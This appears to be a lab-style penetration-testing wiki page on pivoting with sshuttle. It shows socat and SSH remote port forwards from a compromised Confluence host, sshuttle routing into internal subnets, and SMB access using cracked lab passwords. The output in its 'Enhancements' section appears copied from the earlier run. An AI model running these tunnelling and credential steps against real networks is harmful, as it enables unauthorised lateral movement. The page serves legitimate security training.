---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# sshuttle

In situations where the network is more complex than in [previous examples](ssh-dynamic-remote-port-forwarding.md), dynamic forwarding may become difficult to manage.

[`sshuttle`](https://github.com/sshuttle/sshuttle) is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. In order to run sshuttle the attacker must have:

1. Root privileges on the _SSH client_
2. Python3 on the _SSH server_

Because of these prerequisites, it is not always a helpful solution. However, in situations where it can be used it is quite handy.

## Usage

According to the [documentation](https://sshuttle.readthedocs.io/en/stable/usage.html), remote access can be set up with the sshuttle command and the `-r` flag as shown below:

```bash
sshuttle -r user@sshserver 10.4.150.0/24
```

* `-r` specifies a remote connection
* `user@sshserver` is the SSH server endpoint through which traffic will be sent
  * `user` must have root privileges on `sshserver`
* `10.4.150.0/24` species the addresses which will be sent through this interface
  * i.e. anything addressed 10.4.150.X will be routed through the SSH tunnel to `sshserver`
  * Multiple address spaces may be specified here, e.g. `10.4.150.0/24 192.168.0.0/16`&#x20;
  * `0.0.0.0/0` can be used to specify all traffic

## Example

Consider the network that has been seen in previous examples. The basic structure of the network is that there is a perimeter web server (`CONFLUENCE01`) that has access to a PostgreSQL database on a machine called `PGDATABASE01` via an internal network interface. In&#x20;

[this example](../simple-port-forwarding-scenario.md) the attacker compromised some [credentials](../simple-port-forwarding-scenario.md#cracking-the-hash) including `database_admin:sqlpass123`. In another example the attacker found that these credentials provided SSH access to the `PGDATABASE01` machine.

### Setting Up the Port Forward

The port forward set up is the same as seen in [this example](../simple-port-forwarding-scenario.md).

1. `CONFLUENCE01` is compromised with CVE-2022-26134 as seen [here](../simple-port-forwarding-scenario.md#cve-2022-26134)
2. The shell is stabilized with the technique seen [here](../../shells/reverse-shell/netcat.md#simplified)
3. Socat is used to [set up](../simple-port-forwarding-scenario.md#setting-up-the-port-forward) a port forward

The Socat command to set up the forward is:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.190.215:22
```

* `PGDATABASE01` is at `10.4.190.215` and is running SSH on port `22`

### Setting Up sshuttle

Once the port forward is set up sshuttle can be used as specified [above](sshuttle.md#usage) except instead of providing PGDATABASE01's IP address and port (`10.4.190.215:22`) the port forward on CONFLUENCE01's IP and port are used for addressing (`192.168.190.63:2222`):

```bash
sshuttle -r database_admin@192.168.190.63:2222 10.4.190.0/24 172.16.190.0/24
```

* Sends all traffic destined for addresses in `10.4.190.0/24` and `172.16.190.0/24` through sshuttle tunnel to `CONFLUENCE01` port forward (`192.168.190.63:2222`)

This command does not provide a ton of output but does request the SSH password and then has a connected message:

```bash
kali@kali:~$ sshuttle -r database_admin@192.168.190.63:2222 10.4.190.0/24 172.16.190.0/24
The authenticity of host '[192.168.190.63]:2222 ([192.168.190.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+
This host key is known by the following other names/addresses:
~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
database_admin@192.168.190.63's password: 

c : Connected to server.
```

Once this is running other terminal sessions can be used to send traffic over the proxy. The session can be ended with `Ctrl + C`.

### Using the Tunnel

Once the tunnel is set up apps can be used natively. sshuttle will intercept any traffic to the specified address spaces. For example, recall from [this example](ssh-local-port-forwarding.md#setting-up-ssh-local-port-forward) that there is an SMB server running on a machine (`HRSHARES`) that is accessible to `PGDATABASE01` at `172.16.190.217` via the interface connected to `172.16.190.0/24`.&#x20;

To access this machine from the attacker's Kali machine is as simple as using smbclient exactly as if the machine were on the same network:

```
smbclient -L //172.16.190.217/ -U hr_admin --password=Welcome1234
```

* `hr_admin:Welcome1234` credentials were cracked in [this example](../simple-port-forwarding-scenario.md#cracking-the-hash)

sshuttle intercepts this traffic, sends it through the tunnel to `PGDATABASE01` and it is then sent on to `HRSHARES` as seen below (run after `sshuttle` setup in a separate terminal):

```bash
kali@kali:~$ smbclient -L //172.16.190.217/ -U hr_admin --password=Welcome1234

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.190.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                        
kali@kali:~$ smbclient //172.16.190.217/Scripts -U hr_admin --password=Welcome1234
Try "help" to get a list of possible commands.
smb: \> 
```

### Enhancements

Instead of using a simple Socat port forward as seen [above](sshuttle.md#setting-up-the-port-forward), an attacker could instead use an SSH remote port forward from CONFLUENCE01 to PGDATABASE01 as follows:

```bash
ssh -N -R 127.0.0.1:9999:10.4.190.215:22 remote-ssh@192.168.45.159
```

This creates a listener on the attacker's machine (`192.168.45.159`) at `127.0.0.1:9999`. This time when sshuttle is set up, instead of specifying the listener on `CONFLUENCE01` as seen [above](sshuttle.md#setting-up-sshshuttle), the local listener is listed as the remote SSH server:

```bash
sshuttle -r database_admin@127.0.0.1:9999 10.4.190.0/24 172.16.190.0/24
```

This has the same output as above:

```bash
kali@kali:~$ sshuttle -r database_admin@127.0.0.1:9999 10.4.190.0/24 172.16.190.0/24
The authenticity of host '[192.168.190.63]:2222 ([192.168.190.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+
This host key is known by the following other names/addresses:
~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
database_admin@192.168.190.63's password: 

c : Connected to server.
```

This method allows the same utilization of the forward. E.g. smbclient still works as if connected to the same network:

```bash
kali@kali:~$ smbclient //172.16.190.217/Scripts -U hr_admin --password=Welcome1234
Try "help" to get a list of possible commands.
smb: \> 
```
